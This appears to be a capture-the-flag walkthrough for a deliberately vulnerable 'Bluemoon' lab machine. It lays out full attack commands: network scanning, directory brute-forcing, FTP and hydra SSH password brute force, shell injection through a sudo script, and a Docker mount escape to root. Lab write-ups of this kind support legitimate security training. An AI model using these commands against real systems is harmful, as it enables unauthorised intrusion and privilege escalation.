1. scanning the avaliable IP with netdiscover -r 192.168.0.0/24
- Output showing atluemoon1.PNG showing listed IPs

2. Scan IP 192.168.0.32 with command nmap -sC -sV -p- 192.168.0.32
- Output at bluemoon2.PNG shows that 3 ports are open which are ftp, ssh and http

3. entering http://192.168.0.32 at the browser
- Output bluemoon2.PNG proves that this is the target IP

4. using gobuster command both small test and medium text
cmd : gobuster dir -u http://192.168.0.32 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3(small/medium).txt
- Output bluemoon4.PNG shows that medium text command worked and shows directory for the IP which is server-status and hidden_text

5. entering http://192.168.0.32/hidden_text into the browser
- Output bluemoon5.PNG shows the following with an embedded link on the word 'Thank You ...'
- The link leads to a qr code as it shows on bluemoon6.PNG

6. Scanning the qr shows a text which contains password for ftp
- Output on bluemoon7.PNG

7. Entering  command ftp 192.168.0.32 onto the terminal
- Output bluemoon8.PNG shows the login was successful

8. entering ls onto the terminal shows the directory listing
using command get information.txt and get p_lists.txt to get the data transferred as shown on bluemoon9.PNG

9. Using command cat to reveal the text
- Output bluemoon10.PNG shows that the command reveals a message and a lists of potential passwords for the bluemoon

10. using hydra -l robin -P p_lists.txt ssh://192.168.0.32 on the terminal to reveal the password for bluemoon
- Output bluemoon11.PNG shows that the correct password is k4rv3ndh4nh4vk3r

11. Output bluemoon12.PNG shows that the password worked when login on the bluemoon virtual machine
- the first flag can be captured by entering the command ls -al, and the cat user1.txt as shown in bluemoon17.PNG
The same can be done in the terminal with command ssh robin@192.168.0.32 and entering the password

13. entering sudo -l on the terminal will reveal the directory to the feedback.sh as shown on bluemoon13.PNG
- entering the following command, cd project, ls, cat feedback.sh, and then /bin/bash will reveal the feedback script

13. After enteing commmand sudo -u jerry /home/robin/project/feedback.sh it will redirect you to feedback.sh as shown in bluemoon14.PNG
- enter name as jerry and the feedback as /bin/bash.
- enter the following, whoami, pwd, ls, feedback.sh, cd /home.jerry, ls and cat user2.txt will reveal the 2nd flag

14. entering command python -c 'import pty; pty.spawn("/bin/bash")' will change the user from robin to jerry to escalate privileges
- After that, enter id and run docker image ls the docker will be revealed as shown on bluemoon15.PNG

15. Run docker run -v /:/mnt -- rm -it alpine chroot /mnt sh
- Run cd /root to enter the root folder
- Run ls -al to reveal all the directories as shown in bluemoon16.PNG
- and then run cat root.txt to reveal the final flag
